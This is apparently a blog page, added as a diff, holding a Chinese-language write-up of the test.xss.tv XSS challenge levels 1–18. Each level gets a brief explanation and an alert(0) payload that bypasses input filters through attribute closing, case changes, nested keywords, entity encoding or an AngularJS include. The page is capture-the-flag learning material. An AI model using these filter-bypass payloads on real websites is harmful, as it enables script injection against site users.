@@ -1,0 +1,364 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+[test.xss.tv](http://test.xss.tv/)
+
+最短 xss 平台的题目, 一共20关.
+
+19关和20关没做, 都是 xsf, 之前审计过 flash 文件也没啥好印象.
+
+这个相对于之前的 xss challenges 真是一点 Hint 都没有, 不过可以显示出 payload 的长度.
+
+## level 1
+
+最简单的
+
+`<svg onload=alert(0)>`
+
+## level 2
+
+输出在 value 内, 闭合标签后再插入 payload
+
+也可以用 on 事件, 不过这是下一题的考点
+
+`"><img src=0 onerror=alert(0)>`
+
+## level 3
+
+单引号闭合
+
+`1' onmouseover='alert(0)`
+
+## level 4
+
+双引号闭合
+
+`" onmouseover="alert(0)`
+
+## level 5
+
+on 事件被转义成 o_n, script 标签也被转义成 scr_ipt
+
+换一个姿势
+
+`"><a href=javascript:alert(0)>`
+
+## level 6
+
+on href src 都被加上了下划线
+
+大小写绕过
+
+`<a HrEf="javascript:alert(0)">click</a>`
+
+## level 7
+
+这题没有转义, 只是把 on href src script 替换成空, 但只替换了一次
+
+`"><a hrhrefef="javascscriptript:alert(0)">click</a>`
+
+## level 8
+
+关键字都被加上了下划线, 用 html 的自解码机制就可以绕过
+
+`javasc&#114;ipt:alert(0)`
+
+## level 9
+
+keyword 中没有 `http://` 就显示为非法链接
+
+其它的都和上题一样
+
+`javasc&#114;ipt:alert(&#34;http://&#34;)`
+
+## level 10
+
+查看源代码发现有三个隐藏参数, t_link t_history t_sort, 其中只有 t_sort 可控
+
+由于标签是 hidden 的就不能触发 on 事件, 所以要改回 text 状态
+
+`1" type="text" onmouseover="alert(0)`
+
+## level 11
+
+隐藏参数多了个 t_referer, 抓包修改 referer 即可
+
+`1" type="text" onmouseover="alert(0)`
+
+## level 12
+
+抓包修改 user-agent
+
+`1" type="text" onmouseover="alert(0)`
+
+## level 13
+
+打开后发现多了个 cookie `user=call me maybe`, 直接修改 cookie 重新访问页面
+
+`1" type="text" onmouseover="alert(0)`
+
+## level 14
+
+这题做的很迷, 打开后直接就是 401 认证, 乱输几个 payload 也没屌用
+
+在网上看了 writeup 后才发现是图片 exif 信息的 xss
+
+估计网站已经关闭了, 就直接跳过吧
+
+## level 15
+
+查看源代码发现 ng-include 这个参数, 百度一会发现这是 angularjs 的语句, 好像和 php 的文件包含差不多
+
+src 直接包含第一关的内容传参 keyword 为 payload, 并没啥屌用, 后来才发现是 script 标签包含 angularjs 所在的网站被墙了, 恰好又是我大谷歌的地址
+
+包含的时候要加上单引号
+
+`'level1.php?keyword=<svg onload=alert(0)>'`
+
+## level 16
+
+反斜杠空格什么的都被替换成了 `&nbsp;`,  两个换行符就可以干掉它
+
+`<svg%0a%0aonload=alert(0)>`
+
+## level 17
+
+写的是 xsf, 其实只要在 arg02 后面加上 payload 就行了
+
+`1 onmouseover=alert(0)`
+
+## level 18
+
+同 level 17
+
+`1 onmouseover=alert(0)`
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<p><a href="http://test.xss.tv/">test.xss.tv</a></p>
+
+<p>最短 xss 平台的题目, 一共20关.</p>
+
+<p>19关和20关没做, 都是 xsf, 之前审计过 flash 文件也没啥好印象.</p>
+
+<p>这个相对于之前的 xss challenges 真是一点 Hint 都没有, 不过可以显示出 payload 的长度.</p>
+
+<h2 id="level1">level 1</h2>
+
+<p>最简单的</p>
+
+<p><code>&lt;svg onload=alert(0)&gt;</code></p>
+
+<h2 id="level2">level 2</h2>
+
+<p>输出在 value 内, 闭合标签后再插入 payload</p>
+
+<p>也可以用 on 事件, 不过这是下一题的考点</p>
+
+<p><code>"&gt;&lt;img src=0 onerror=alert(0)&gt;</code></p>
+
+<h2 id="level3">level 3</h2>
+
+<p>单引号闭合</p>
+
+<p><code>1' onmouseover='alert(0)</code></p>
+
+<h2 id="level4">level 4</h2>
+
+<p>双引号闭合</p>
+
+<p><code>" onmouseover="alert(0)</code></p>
+
+<h2 id="level5">level 5</h2>
+
+<p>on 事件被转义成 o<em>n, script 标签也被转义成 scr</em>ipt</p>
+
+<p>换一个姿势</p>
+
+<p><code>"&gt;&lt;a href=javascript:alert(0)&gt;</code></p>
+
+<h2 id="level6">level 6</h2>
+
+<p>on href src 都被加上了下划线</p>
+
+<p>大小写绕过</p>
+
+<p><code>&lt;a HrEf="javascript:alert(0)"&gt;click&lt;/a&gt;</code></p>
+
+<h2 id="level7">level 7</h2>
+
+<p>这题没有转义, 只是把 on href src script 替换成空, 但只替换了一次</p>
+
+<p><code>"&gt;&lt;a hrhrefef="javascscriptript:alert(0)"&gt;click&lt;/a&gt;</code></p>
+
+<h2 id="level8">level 8</h2>
+
+<p>关键字都被加上了下划线, 用 html 的自解码机制就可以绕过</p>
+
+<p><code>javasc&amp;#114;ipt:alert(0)</code></p>
+
+<h2 id="level9">level 9</h2>
+
+<p>keyword 中没有 <code>http://</code> 就显示为非法链接</p>
+
+<p>其它的都和上题一样</p>
+
+<p><code>javasc&amp;#114;ipt:alert(&amp;#34;http://&amp;#34;)</code></p>
+
+<h2 id="level10">level 10</h2>
+
+<p>查看源代码发现有三个隐藏参数, t<em>link t</em>history t<em>sort, 其中只有 t</em>sort 可控</p>
+
+<p>由于标签是 hidden 的就不能触发 on 事件, 所以要改回 text 状态</p>
+
+<p><code>1" type="text" onmouseover="alert(0)</code></p>
+
+<h2 id="level11">level 11</h2>
+
+<p>隐藏参数多了个 t_referer, 抓包修改 referer 即可</p>
+
+<p><code>1" type="text" onmouseover="alert(0)</code></p>
+
+<h2 id="level12">level 12</h2>
+
+<p>抓包修改 user-agent</p>
+
+<p><code>1" type="text" onmouseover="alert(0)</code></p>
+
+<h2 id="level13">level 13</h2>
+
+<p>打开后发现多了个 cookie <code>user=call me maybe</code>, 直接修改 cookie 重新访问页面</p>
+
+<p><code>1" type="text" onmouseover="alert(0)</code></p>
+
+<h2 id="level14">level 14</h2>
+
+<p>这题做的很迷, 打开后直接就是 401 认证, 乱输几个 payload 也没屌用</p>
+
+<p>在网上看了 writeup 后才发现是图片 exif 信息的 xss</p>
+
+<p>估计网站已经关闭了, 就直接跳过吧</p>
+
+<h2 id="level15">level 15</h2>
+
+<p>查看源代码发现 ng-include 这个参数, 百度一会发现这是 angularjs 的语句, 好像和 php 的文件包含差不多</p>
+
+<p>src 直接包含第一关的内容传参 keyword 为 payload, 并没啥屌用, 后来才发现是 script 标签包含 angularjs 所在的网站被墙了, 恰好又是我大谷歌的地址</p>
+
+<p>包含的时候要加上单引号</p>
+
+<p><code>'level1.php?keyword=&lt;svg onload=alert(0)&gt;'</code></p>
+
+<h2 id="level16">level 16</h2>
+
+<p>反斜杠空格什么的都被替换成了 <code>&amp;nbsp;</code>,  两个换行符就可以干掉它</p>
+
+<p><code>&lt;svg%0a%0aonload=alert(0)&gt;</code></p>
+
+<h2 id="level17">level 17</h2>
+
+<p>写的是 xsf, 其实只要在 arg02 后面加上 payload 就行了</p>
+
+<p><code>1 onmouseover=alert(0)</code></p>
+
+<h2 id="level18">level 18</h2>
+
+<p>同 level 17</p>
+
+<p><code>1 onmouseover=alert(0)</code></p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "xss-tv-writeup.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
